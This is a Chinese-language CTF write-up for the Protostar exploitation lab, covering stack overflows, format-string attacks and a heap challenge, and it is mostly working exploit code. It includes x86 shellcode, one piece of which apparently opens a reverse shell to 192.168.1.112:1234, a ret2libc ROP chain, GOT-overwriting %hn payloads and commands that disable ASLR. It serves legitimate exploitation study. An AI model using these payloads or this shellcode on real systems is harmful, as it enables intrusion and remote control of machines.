---
layout: post
title: Protostar WriteUp
catagories: [ctf-execrise]
tags: [ctf, writeup, protostar]
---

> 堆、栈、格式化字符串漏洞利用学习


##Stack0

`gets()`函数不检查输入长度是否已溢出，所以输入超过buffer的长度，自然会覆盖到栈上的其它变量，
而`Modified`变量是紧跟着`buffer[]`的，因此被改写。

```
$ ./stack0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
you have changed the 'modified' variable
$ 
```

##Stack1

这一题要求modified的变量值为`0x61626364`. 因为数据是小端表示的，因此传给modifed的字符串应该是`"dcba"`.

```
$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
you have correctly got the variable to the right value
$ 
```

##Stack2

因为`os.environ`改过的环境变量只在这个进程内部有效，进程外部无效，但其子进程是继承的父进程的环境变量，所以可以用`subprocess.Popen`来运行stack2

```python
import os
import subprocess
os.environ["GREENIE"]="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\x0a\x0d\x0a\x0d"
#print os.environ["GREENIE"]

cmd = "/opt/protostar/bin/stack2"
subprocess.Popen(cmd, close_fds=True, stderr=subprocess.PIPE, shell=True)
```

```
$ python ss.py
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


$ you have correctly modified the variable
```

##Stack3

`objdump -d stack3`，拿到win()的地址`0x08048424`

构造输入：

```
$ python -c "print 'A'*64 + '\x24\x84\x04\x08'"|./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
$ 
```

##Stack4

拿到win()的地址`080483f4`

因为有对齐，原来的栈顶`0xbffffc48`变成了`0xbffffc40`

eip在ebp的下方

因此，应填充的padd为64+8+4,下接win的地址

```python
python -c "print 'A'*64 + 'B'*8 +'C'*4 + '\xf4\x83\x04\x08'"
```

```
$  python -c "print 'A'*64 + 'B'*8 +'C'*4 + '\xf4\x83\x04\x08'"|./stack4
code flow successfully changed
Segmentation fault
```

##Stack5

几个技巧：

1. nasm与ndisasm很强大，一个汇编编译，一个反汇编
2. 调试时关闭地址随机化`echo 0 >/proc/sys/kernel/randomize_va_space`
3. pwntools和msfconsole很强大，生成shellcode的话，msfconsole很全
4. core dump很有必要，因为gdb下和真实运行还是有很大差别的.`ulimit -c unlimited`和`echo "/tmp/core-%e-%p-%t" > /proc/sys/kernel/core_pattern`

标准的栈溢出，试过n种shellcode,明显msfconsole生成的更灵活，exploit-db太多，不知如何选择
`http://shell-storm.org/shellcode/, http://www.exploit-db.com/`

```python
#!/usr/bin/env python

#shell = '31c9f7e96a01fe0c24682f2f7368682f62696eb00b89e3cd80'.decode("hex")

#shell = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73" +\
        #"\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00" +\
        #"\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd" +\
        #"\x80"

#buf =  ""
#buf += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
#buf += "\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0"
#buf += "\xa8\x01\x70\x68\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50"
#buf += "\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73"
#buf += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0"
#buf += "\x0b\xcd\x80"


buf =  ""
buf += "\x31\xc9\x31\xdb\xf7\xe3\xb0\xa4\xcd\x80\x31\xdb\x6a"
buf += "\x17\x58\xcd\x80\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02"
buf += "\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49"
buf += "\x79\xf9\x68\xc0\xa8\x01\x70\x68\x02\x00\x04\xd2\x89"
buf += "\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52"
buf += "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52"
buf += "\x53\x89\xe1\xb0\x0b\xcd\x80"


#buf =  ""
#buf += "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
#buf += "\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
#buf += "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

#shellcode = "\x90"*(76-len(buf))+buf+ "\x40\xfc\xff\xbf" //放在ebp前, 效果不好
shellcode = "A"*76 +"\x74\xfe\xff\xbf" + "\x90"*16 +  buf //放在ebp后

fd = open("shellcode", "w")
fd.write(shellcode)
```
gets()这种溢出，还有个情况，/bin/sh时，标准输入会出现一些问题，导致刚运行即退出的现象，
所以stdin需要重新打开，这有个牛B的shellcode,备忘：
[http://www.exploit-db.com/exploits/13357/](http://www.exploit-db.com/exploits/13357/)

> 原来这种情况是这样的：`<`这个符号导致的原因
> 有人提出这种方法` (cat payload5; cat) | /opt/protostar/bin/stack5`

```c
/*
 * $Id: gets-linux.c,v 1.3 2004/06/02 12:22:30 raptor Exp $
 *
 * gets-linux.c - stdin re-open shellcode for Linux/x86
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Local shellcode for stdin re-open and /bin/sh exec. It closes stdin 
 * descriptor and re-opens /dev/tty, then does an execve() of /bin/sh.
 * Useful to exploit some gets() buffer overflows in an elegant way...
 */
 
/*
 * close(0) 
 *
 * 8049380:       31 c0                   xor    %eax,%eax
 * 8049382:       31 db                   xor    %ebx,%ebx
 * 8049384:       b0 06                   mov    $0x6,%al
 * 8049386:       cd 80                   int    $0x80
 *
 * open("/dev/tty", O_RDWR | ...)
 *
 * 8049388:       53                      push   %ebx
 * 8049389:       68 2f 74 74 79          push   $0x7974742f
 * 804938e:       68 2f 64 65 76          push   $0x7665642f
 * 8049393:       89 e3                   mov    %esp,%ebx
 * 8049395:       31 c9                   xor    %ecx,%ecx
 * 8049397:       66 b9 12 27             mov    $0x2712,%cx
 * 804939b:       b0 05                   mov    $0x5,%al
 * 804939d:       cd 80                   int    $0x80
 *
 * execve("/bin/sh", ["/bin/sh"], NULL)
 *
 * 804939f:       31 c0                   xor    %eax,%eax
 * 80493a1:       50                      push   %eax
 * 80493a2:       68 2f 2f 73 68          push   $0x68732f2f
 * 80493a7:       68 2f 62 69 6e          push   $0x6e69622f
 * 80493ac:       89 e3                   mov    %esp,%ebx
 * 80493ae:       50                      push   %eax
 * 80493af:       53                      push   %ebx
 * 80493b0:       89 e1                   mov    %esp,%ecx
 * 80493b2:       99                      cltd   
 * 80493b3:       b0 0b                   mov    $0xb,%al
 * 80493b5:       cd 80                   int    $0x80
 */
 
char sc[] = 
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
 
main()
{
    int (*f)() = (int (*)())sc; f();
}
 
// milw0rm.com [2006-07-20]
```

要拿root权限，还需要跑/opt/protostar/bin/stack5这个路径下的文件，不过因为文件夹对user用户有写限制，
所以core dump不好生成，可在root权限下生成core dump进行分析

##Stack6

现学了pwntools的使用，用它的ROP包搞定吧，虽然这里只有ret2libc。

```python
from pwn import *

system = 0x4005cfb0     #GDB里print system查到的,也可以objdump -T *来计算到
cmd = 0x80482a8 + 12    #LIBC_2.0,objdump-s *找到的，可随便找一字符串,需要本地写一个文件

s6 = ELF("stack6")
r6 = ROP(s6)
r6.call(system, [cmd])

shellcode = ""
shellcode += "A"*0x4c +"B"*4
shellcode += r6.chain()

fd = open("shellcode6", "w")
fd.write(shellcode)
fd.close()
```

```
user@protostar:/tmp$ cat shellcode6 -|./stack6
input path please: 
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@AAAAAAAABBBB�@ﾭ޴�
whoami
user
pwd
/tmp
```

Done！

##Stack7 

同第六题，只是cmd的位置需要重找一下`cmd = 0x80482cc + 3`

##String Format Exploiting

先学了一下什么是格式化字符漏洞，及其利用方法：[http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html](http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html)

重点是利用`‘$n’`，反复试了几次，发现以下几点需要注意：

* 引号还是要用单引号，双引号不work.
* `$n`符号是改变的对应的地址指向的值。比如`print('$2$n', i, j)`,改变的是`&j`的值，即j做为地址指向的值。

去掉环境变量，使调试器里外栈的值一样。

```
$ env -i /usr/bin/printenv
$ gdb -q /usr/bin/printenv
Reading symbols from /usr/bin/printenv...(no debugging symbols found)...done.
(gdb) unset env
Delete all environment variables? (y or n) y
(gdb) r
Starting program: /usr/bin/printenv 
PWD=/home/ppp
SHLVL=0
```

```
$ env -i PWD=$(pwd) SHLVL=0 ./a.out "$(python -c 'print "my_exploit_string"')" # Outside gdb.
$ gdb ./a.out # Inside gdb.
(gdb) unset env
Delete all environment variables? (y or n) y
(gdb) r "$(/usr/bin/python -c 'print "my_exploit_string"')"
```

通用型，调试开始32bit参数:`"$(python -c 'import sys; sys.stdout.write("sh;#AAAABBBB%00000x%106$hp%00000x%107$hp")')"`

##Format0

```
./format0 "$(python -c 'import sys; sys.stdout.write("%64x\xef\xbe\ad\de")')"
```

##Format1

`objdump -t format1`,得到`target`的地址：`0x08049638`

```
#第一步，先找到字符串在栈上的位置，这里确定113,和114两个值
env -i PWD=$(pwd) ./format1 "$(python -c 'import sys; sys.stdout.write("AAAABBBB%00000x%113$hp%00000x%114$hp")')"
#第二步，尝试将要该改写的target地址写进去，试着能否还能打印出来
env -i PWD=$(pwd) ./format1 "$(python -c 'import sys; sys.stdout.write("\x38\x96\x04\x08\x3a\x96\x04\x08%00001x%113$hp%00002x%114$hp")')"
#第三步，将p换成n，将随便给一些值，将相应的值写进target里，如果要求写成0xdeadbeef
env -i PWD=$(pwd) ./format1 "$(python -c 'import sys; sys.stdout.write("\x38\x96\x04\x08\x3a\x96\x04\x08%48871x%113$hn%08126x%114$hn")')"
```

##Format2

`objdump -t format1`,得到`target`的地址：`0x080496e4`

```
在GDB里：
stdin:
AAAABBBB%00000x%4$hp%00000x%5$hp

将之写到文件里
python -c 'import sys; sys.stdout.write("\xe4\x96\x04\x08%00060x%4$hn")' > input2

从文件读取：
user@protostar:/opt/protostar/bin$ env -i PWD=$(pwd) ./format2 </tmp/input2 
000000000000000000000000000000000000000000000000000000000200you have modified the target :)
```

##Format3

```
target的值080496f4
要改的值：
高位：0x0102
低位：0x5544

探查位置:
AAAABBBB%00000x%12$hp%00000x%13$hp

python -c 'import sys; sys.stdout.write("\xf6\x96\x04\x08\xf4\x96\x04\x08%00250x%12$hn%21570x%13$hn")' > input3
#"<"符又患毛病了，改用cat就work了
env -i PWD=$(pwd) cat /tmp/input3 |./format3
```

##Format4

`objdump -TR`来查看GOT表

```
exit    0x08049724

hello   
高位：0x0804
低位：0x84b4

python -c 'import sys; sys.stdout.write("\x26\x97\x04\x08\x24\x97\x04\x08%02044x%4$hn%31920x%5$hn")' > input4
env -i PWD=$(pwd) cat /tmp/input4 |./format4
```

##Heap Exploit 

`readelf --relocs example`读GOT表

buf1 = 0x804a008
buf2 = 0x804a110  264
free = 0x080496e0 - 8
0x80496d8- 0x804a110  
0x080496e0 - 0x804a110  = fffff5d0
'\xd0\xf5\xff\xff'
fffff5c8

`python -c 'print "A"*260 + "\xff\xff\xff\xff"'` fffff5c8 AAAA

##Heap0

```
d = 0x804a008
f = 0x804a050
d的容量是64,为何相差72,剩余的8个用来做什么？
winner = 0x08048464

/opt/protostar/bin/heap0 `python -c 'import sys; sys.stdout.write("A"*72+"\x64\x84\x04\x08")'`
```

